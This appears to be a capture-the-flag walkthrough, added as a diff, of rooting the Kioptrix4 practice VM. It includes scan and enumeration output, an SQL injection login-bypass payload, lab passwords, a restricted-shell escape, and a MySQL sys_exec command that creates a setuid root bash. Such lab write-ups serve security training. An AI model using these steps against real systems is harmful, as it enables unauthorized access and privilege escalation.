@@ -1,0 +1,176 @@
+IP - 10.0.2.26
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+┌──(root㉿kali)-[~/Desktop/vulhub/Kioptrix4]
+└─# nmap -sC -sV 10.0.2.26 -p- -oN nmap_all_port.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 02:52 +0630
+Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.82% done; ETC: 02:53 (0:00:00 remaining)
+Nmap scan report for 10.0.2.26
+Host is up (0.00011s latency).
+Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9bad4ff21ec5f23914b9d3a00be84171 (DSA)
+|_  2048 8540c6d541260534adf86ef2a76b4f0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
+MAC Address: 08:00:27:D1:F9:40 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h30m00s, deviation: 3h32m08s, median: 0s
+|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2023-02-10T15:23:03-05:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.37 seconds
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+enum4linux result
+
+After running enum4linux I found 3 username:
+
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                 
+                                                                                                                                                            
+S-1-22-1-1000 Unix User\loneferret (Local User)                                                                                                             
+S-1-22-1-1001 Unix User\john (Local User)
+S-1-22-1-1002 Unix User\robert (Local User)
+
+
+I tried SQL Injection Auth bypass with both username and password. I found that password field is vulnerable to SQLi. So, I tried with those usernames that I found from smb enumeration.
+
+Found only worked with username john,robert with this payload into password field:
+
+username - john
+
+payload - john' OR 1=1 -- -
+
+username - robert
+
+payload - robert' OR 1=1 -- -
+
+Found juicy credential
+
+Member's Control Panel
+Username 	: 	john
+Password 	: 	MyNameIsJohn
+
+Member's Control Panel
+Username 	: 	robert
+Password 	: 	ADGAdsafdfwt4gadfga==
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Gain User Access
+
+I tried login into ssh with username john and password as MyNameIsJohn:
+
+┌──(root㉿kali)-[~]
+└─# ssh john@10.0.2.26 -oHostKeyAlgorithms=+ssh-dss
+The authenticity of host '10.0.2.26 (10.0.2.26)' can't be established.
+DSA key fingerprint is SHA256:l2Z9xv+mXqcandVHZntyNeV1loP8XoFca+R/2VbroAw.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.26' (DSA) to the list of known hosts.
+john@10.0.2.26's password: 
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don't screw up
+Type '?' or 'help' to get the list of allowed commands
+john:~$
+
+Shell Escaping with echo:
+
+echo os.system('/bin/bash')
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escaltion with mysql
+
+After running linpeas.sh, I found that we can login into mysql as root without password.
+
+and also found:
+
+╔══════════╣ Searching mysql credentials and exec
+Found lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so                                                                                                        
+If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
+Found lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
+If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
+From '/etc/mysql/my.cnf' Mysql user: user               = root
+Found readable /etc/mysql/my.cnf
+
+I tried sys_eval('id'); But it didn't work so I tried another command exec:
+
+use mysql;
+
+mysql> SELECT sys_exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash');                                 
+ERROR 2006 (HY000): MySQL server has gone away
+No connection. Trying to reconnect...
+Connection id:    1
+Current database: *** NONE ***
+
++--------------------------------------------------------+
+| sys_exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash') |
++--------------------------------------------------------+
+| NULL                                                   | 
++--------------------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql> exit
+Bye
+
+john@Kioptrix4:/tmp$ ./bash -p
+bash-3.2# whoami
+root
+
+root flag
+
+root@Kioptrix4:/root# cat congrats.txt 
+Congratulations!
+You've got root.
+
+There is more then one way to get root on this system. Try and find them.
+I've only tested two (2) methods, but it doesn't mean there aren't more.
+As always there's an easy way, and a not so easy way to pop this box.
+Look for other methods to get root privileges other than running an exploit.
+
+It took a while to make this. For one it's not as easy as it may look, and
+also work and family life are my priorities. Hobbies are low on my list.
+Really hope you enjoyed this one.
+
+If you haven't already, check out the other VMs available on:
+www.kioptrix.com
+
+Thanks for playing,
+loneferret
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Add new user as root 
+
+user - lol
+password - pass123
+
